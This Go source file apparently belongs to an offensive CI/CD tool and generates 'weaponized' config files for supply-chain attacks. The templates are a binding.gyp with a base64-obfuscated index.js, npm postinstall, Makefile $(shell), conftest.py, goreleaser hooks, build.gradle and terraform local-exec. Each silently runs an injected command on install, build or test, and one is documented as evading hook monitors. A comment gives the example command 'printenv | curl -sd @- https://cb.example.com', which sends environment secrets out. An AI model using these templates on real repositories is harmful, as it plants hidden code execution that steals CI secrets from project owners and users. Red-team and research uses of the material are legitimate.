package payloads

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// LOTPFile is a single file that forms part of a LOTP attack payload.
type LOTPFile struct {
	// Path is the repo-relative path to create/overwrite (e.g., "binding.gyp").
	Path string
	// Content is the file content to commit.
	Content string
}

// LOTPPayload is a set of files that weaponize a CI tool's config so that
// the next pipeline run executes an attacker-controlled command. Generated
// payloads target the LOTP catalog (https://boostsecurityio.github.io/lotp/).
type LOTPPayload struct {
	// Tool is the canonical LOTP tool name (e.g., "npm-gyp", "make").
	Tool string
	// Files contains one or more repo files to create/replace.
	Files []LOTPFile
	// Description explains the attack mechanism.
	Description string
	// Reference links to upstream LOTP or research documentation.
	Reference string
}

// KnownLOTPTools lists the supported tool identifiers for GenerateLOTPPayload.
var KnownLOTPTools = []string{
	"npm-gyp", "gyp", "npm", "make", "pytest", "goreleaser", "gradle", "terraform", "tf",
}

// GenerateLOTPPayload creates a weaponized config payload for the given LOTP tool.
// cmd is the shell command to inject (e.g., "printenv | curl -sd @- https://cb.example.com").
//
// Supported tools (case-insensitive):
//
//	npm-gyp / gyp  — binding.gyp + index.js (Phantom Gyp; evades package.json hook monitors)
//	npm            — package.json postinstall script
//	make           — Makefile $(shell ...) variable assignment
//	pytest         — conftest.py top-level subprocess call
//	goreleaser     — .goreleaser.yml before.hooks
//	gradle         — build.gradle exec block (Groovy config-time)
//	terraform / tf — main.tf null_resource local-exec
func GenerateLOTPPayload(tool, cmd string) (*LOTPPayload, error) {
	if strings.TrimSpace(cmd) == "" {
		return nil, fmt.Errorf("cmd must not be empty")
	}
	switch strings.ToLower(strings.TrimSpace(tool)) {
	case "npm-gyp", "gyp":
		return generateGYPPayload(cmd), nil
	case "npm":
		return generateNPMPostinstallPayload(cmd), nil
	case "make":
		return generateMakefilePayload(cmd), nil
	case "pytest":
		return generatePytestPayload(cmd), nil
	case "goreleaser":
		return generateGoreleaserPayload(cmd), nil
	case "gradle":
		return generateGradlePayload(cmd), nil
	case "terraform", "tf":
		return generateTerraformPayload(cmd), nil
	default:
		return nil, fmt.Errorf("unsupported LOTP tool %q; supported: %s", tool, strings.Join(KnownLOTPTools, ", "))
	}
}

// generateGYPPayload implements the "Phantom Gyp" technique documented by StepSecurity:
// https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm
//
// When npm encounters a binding.gyp file it automatically runs `node-gyp rebuild`.
// The gyp `<!(...)` command substitution executes node index.js silently.
// No preinstall/postinstall appears in package.json, bypassing the most common hook monitors.
// The command is base64-encoded in index.js to evade naive string matching.
//
// Two files are committed:
//   - binding.gyp  — gyp target that triggers node index.js via command substitution
//   - index.js     — Node.js payload; decodes and executes the attacker command
func generateGYPPayload(cmd string) *LOTPPayload {
	gypContent := `{
  "targets": [
    {
      "target_name": "setup",
      "type": "none",
      "sources": [
        "<!(node index.js > /dev/null 2>&1 && echo stub.c)"
      ]
    }
  ]
}
`
	// base64-encode the command so it doesn't appear in plaintext in index.js.
	b64cmd := base64.StdEncoding.EncodeToString([]byte(cmd))
	indexJS := fmt.Sprintf(`'use strict';
const { execSync } = require('child_process');
try {
  const c = Buffer.from('%s', 'base64').toString('utf8');
  execSync(c, { stdio: ['ignore', 'pipe', 'pipe'] });
} catch (_) {}
`, b64cmd)

	return &LOTPPayload{
		Tool: "npm-gyp",
		Files: []LOTPFile{
			{Path: "binding.gyp", Content: gypContent},
			{Path: "index.js", Content: indexJS},
		},
		Description: "Phantom Gyp: binding.gyp triggers node-gyp on `npm install`, executing index.js via gyp command substitution. Bypasses package.json lifecycle hook monitoring. Command is base64-encoded in index.js.",
		Reference:   "https://www.stepsecurity.io/blog/binding-gyp-npm-supply-chain-attack-spreads-like-worm",
	}
}

// generateNPMPostinstallPayload injects a postinstall hook into package.json.
// Trigger: any `npm install`.
func generateNPMPostinstallPayload(cmd string) *LOTPPayload {
	pkg := map[string]any{
		"name":    "project",
		"version": "1.0.0",
		"scripts": map[string]string{
			"postinstall": cmd,
		},
	}
	b, _ := json.MarshalIndent(pkg, "", "  ")
	return &LOTPPayload{
		Tool:        "npm",
		Files:       []LOTPFile{{Path: "package.json", Content: string(b) + "\n"}},
		Description: "npm postinstall lifecycle hook in package.json executes on every `npm install`. Easily monitored by security tools — prefer npm-gyp for evasion.",
		Reference:   "https://boostsecurityio.github.io/lotp/",
	}
}

// generateMakefilePayload uses the `$(shell ...)` GNU Make function in a
// variable assignment at the top of the Makefile. This evaluates before any
// target — including when make is invoked with an explicit target name.
// Trigger: `make` / `make <target>` / `./gradlew` via Makefile wrapper.
func generateMakefilePayload(cmd string) *LOTPPayload {
	// Escape dollar signs so they aren't re-expanded by make.
	escaped := strings.ReplaceAll(cmd, "$", "$$")
	content := fmt.Sprintf("# Auto-generated setup\n_ := $(shell %s 2>/dev/null)\n\n.PHONY: all\nall:\n\t@echo done\n", escaped)
	return &LOTPPayload{
		Tool:        "make",
		Files:       []LOTPFile{{Path: "Makefile", Content: content}},
		Description: "GNU Make $(shell ...) variable expansion evaluates on any `make` invocation before target processing. Compatible with GNU Make >= 3.81.",
		Reference:   "https://boostsecurityio.github.io/lotp/",
	}
}

// generatePytestPayload creates a conftest.py with top-level execution.
// pytest imports conftest.py at collection time, before any test runs.
// Trigger: `pytest` / `python -m pytest` / `pytest --collect-only`.
func generatePytestPayload(cmd string) *LOTPPayload {
	escapedCmd := strings.ReplaceAll(cmd, "'", "\\'")
	content := fmt.Sprintf(`import subprocess

# conftest.py is auto-imported by pytest before test collection
try:
    subprocess.run('%s', shell=True, capture_output=True, timeout=30)
except Exception:
    pass
`, escapedCmd)
	return &LOTPPayload{
		Tool:        "pytest",
		Files:       []LOTPFile{{Path: "conftest.py", Content: content}},
		Description: "pytest auto-imports conftest.py at collection time. Top-level code runs before any test — even `pytest --collect-only`.",
		Reference:   "https://boostsecurityio.github.io/lotp/",
	}
}

// generateGoreleaserPayload uses goreleaser's before.hooks block.
// Hooks run before any build, release, or check operation.
// Trigger: `goreleaser release` / `goreleaser build` / `goreleaser check`.
func generateGoreleaserPayload(cmd string) *LOTPPayload {
	escapedCmd := strings.ReplaceAll(cmd, "'", "'\\''")
	content := fmt.Sprintf(`# goreleaser configuration
version: 2

before:
  hooks:
    - sh -c '%s'

builds:
  - binary: app
    main: .
    goos: [linux, darwin]
    goarch: [amd64, arm64]

archives:
  - format: tar.gz
`, escapedCmd)
	return &LOTPPayload{
		Tool:        "goreleaser",
		Files:       []LOTPFile{{Path: ".goreleaser.yml", Content: content}},
		Description: "goreleaser before.hooks run shell commands before any build or release operation.",
		Reference:   "https://boostsecurityio.github.io/lotp/",
	}
}

// generateGradlePayload uses a Groovy exec block in build.gradle.
// The List.execute() call runs at Gradle configuration time.
// Trigger: any `gradle` / `./gradlew` task invocation.
func generateGradlePayload(cmd string) *LOTPPayload {
	escaped := strings.ReplaceAll(cmd, `\`, `\\`)
	escaped = strings.ReplaceAll(escaped, "'", "\\'")
	content := fmt.Sprintf(`plugins {
    id 'java'
}

// Configuration-time code runs on every gradle invocation
def proc = ['sh', '-c', '%s'].execute()
proc.waitForOrKill(10000)

group = 'com.example'
version = '1.0.0'

repositories {
    mavenCentral()
}
`, escaped)
	return &LOTPPayload{
		Tool:        "gradle",
		Files:       []LOTPFile{{Path: "build.gradle", Content: content}},
		Description: "Groovy List.execute() in build.gradle runs at Gradle configuration time — any task triggers it, including `./gradlew tasks`.",
		Reference:   "https://boostsecurityio.github.io/lotp/",
	}
}

// generateTerraformPayload uses a null_resource local-exec provisioner.
// The always_run trigger forces re-execution on every plan/apply.
// Trigger: `terraform plan` / `terraform apply`.
func generateTerraformPayload(cmd string) *LOTPPayload {
	escaped := strings.ReplaceAll(cmd, `"`, `\"`)
	content := fmt.Sprintf(`terraform {
  required_version = ">= 1.0"
}

resource "null_resource" "setup" {
  provisioner "local-exec" {
    command = "%s"
  }

  triggers = {
    always_run = timestamp()
  }
}
`, escaped)
	return &LOTPPayload{
		Tool:        "terraform",
		Files:       []LOTPFile{{Path: "main.tf", Content: content}},
		Description: "Terraform null_resource local-exec provisioner runs a shell command on `terraform apply`. The timestamp() trigger forces re-execution every run.",
		Reference:   "https://boostsecurityio.github.io/lotp/",
	}
}
